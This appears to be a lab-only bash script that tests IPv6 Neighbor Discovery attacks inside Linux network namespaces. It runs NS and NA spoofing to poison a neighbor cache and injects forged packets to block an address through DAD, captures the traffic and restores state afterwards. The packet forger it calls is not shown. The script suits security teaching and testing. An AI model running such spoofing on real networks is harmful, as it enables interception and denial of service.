#!/usr/bin/env bash
# Lab05-only, bounded NS/NA and DAD interference test, with automatic recovery.
set -Eeuo pipefail
[[ $EUID == 0 ]] || { echo 'Use sudo'; exit 1; }
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
EVD="$ROOT/evidence"
mkdir -p "$EVD"
for ns in l05pc1 l05pc2 l05atk l05swa; do
  ip netns list | grep -q "^$ns " || { echo "Missing namespace $ns"; exit 1; }
done
for dev in l05atkp l05aTr; do ip link show "$dev" >/dev/null; done
for bin in tcpdump python3 ping; do command -v "$bin" >/dev/null || { echo "Missing $bin"; exit 1; }; done
CAP1=""; CAP2=""
recover(){
  ip -n l05swa -6 addr del 2000::55aa/64 dev lan100 >/dev/null 2>&1 || true
  ip -n l05pc1 -6 neigh del 2000::2 dev eth0 >/dev/null 2>&1 || true
  for pid in "$CAP1" "$CAP2"; do
    [[ -z "$pid" ]] || { kill "$pid" 2>/dev/null || true; wait "$pid" 2>/dev/null || true; }
  done
  ip netns exec l05pc1 ping -6 -c 1 -W 2 2000::2 >/dev/null 2>&1 || true
}
trap recover EXIT

echo '===== BASELINE ====='
ip netns exec l05pc1 ping -6 -c 2 -W 2 2000::2
ip -n l05pc1 -6 neigh show 2000::2 dev eth0

tcpdump -ni l05atkp -U -s 0 -w "$EVD/04_ns_na_spoof.pcap" 'icmp6' > "$EVD/04_capture.log" 2>&1 & CAP1=$!
sleep 0.5; kill -0 "$CAP1"

echo '===== NS SPOOFING (3 FRAMES) ====='
ip -n l05pc1 -6 neigh del 2000::2 dev eth0 >/dev/null 2>&1 || true
ip netns exec l05atk python3 "$ROOT/scripts/forge_nd.py" ns
sleep 0.5
ip -n l05pc1 -6 neigh show 2000::2 dev eth0
if ip -n l05pc1 -6 neigh show 2000::2 dev eth0 | grep -iq '02:05:05:00:01:aa'; then
  echo 'NS_CACHE_POISONED=YES'
else
  echo 'NS_CACHE_POISONED=NO'
fi

echo '===== RECOVER CACHE ====='
ip -n l05pc1 -6 neigh del 2000::2 dev eth0 >/dev/null 2>&1 || true
ip netns exec l05pc1 ping -6 -c 2 -W 2 2000::2
ip -n l05pc1 -6 neigh show 2000::2 dev eth0

echo '===== NA SPOOFING (3 FRAMES) ====='
ip netns exec l05atk python3 "$ROOT/scripts/forge_nd.py" na
sleep 0.4
ip -n l05pc1 -6 neigh show 2000::2 dev eth0
if ip -n l05pc1 -6 neigh show 2000::2 dev eth0 | grep -iq '02:05:05:00:01:aa'; then
  echo 'NA_CACHE_POISONED=YES'
else
  echo 'NA_CACHE_POISONED=NO'
fi

kill "$CAP1" 2>/dev/null || true; wait "$CAP1" 2>/dev/null || true; CAP1=""
echo '===== NS/NA PCAP ====='
tcpdump -nn -r "$EVD/04_ns_na_spoof.pcap" 'icmp6' | tail -n 18 || true

echo '===== RECOVER PC1 ====='
ip -n l05pc1 -6 neigh del 2000::2 dev eth0 >/dev/null 2>&1 || true
ip netns exec l05pc1 ping -6 -c 2 -W 2 2000::2
ip -n l05pc1 -6 neigh show 2000::2 dev eth0

echo '===== DAD INTERFERENCE (2000::55aa) ====='
tcpdump -ni l05aTr -U -s 0 -w "$EVD/05_dad_interference.pcap" 'icmp6' > "$EVD/05_capture.log" 2>&1 & CAP2=$!
sleep 0.5; kill -0 "$CAP2"
ip netns exec l05atk python3 "$ROOT/scripts/forge_nd.py" dad > "$EVD/05_injector.log" 2>&1 & INJECT=$!
sleep 0.15
ip -n l05swa -6 addr add 2000::55aa/64 dev lan100
wait "$INJECT"; sleep 1
ip -n l05swa -6 addr show dev lan100
if ip -n l05swa -o -6 addr show dev lan100 | grep '2000::55aa/64' | grep -q dadfailed; then
  echo 'DAD_SPOOF_BLOCKED_ADDRESS=YES'
else
  echo 'DAD_SPOOF_BLOCKED_ADDRESS=NO'
fi
cat "$EVD/05_injector.log"
kill "$CAP2" 2>/dev/null || true; wait "$CAP2" 2>/dev/null || true; CAP2=""
echo '===== DAD PCAP ====='
tcpdump -nn -r "$EVD/05_dad_interference.pcap" 'icmp6' | tail -n 18 || true

echo '===== FINAL RECOVERY ====='
recover
trap - EXIT
if ! ip netns exec l05pc1 ping -6 -c 2 -W 2 2000::2; then
  echo RESTORE_CHECK_FAIL; exit 1
fi
ip -n l05pc1 -6 neigh show 2000::2 dev eth0
echo LAB05_SECURITY_TEST_FINISHED
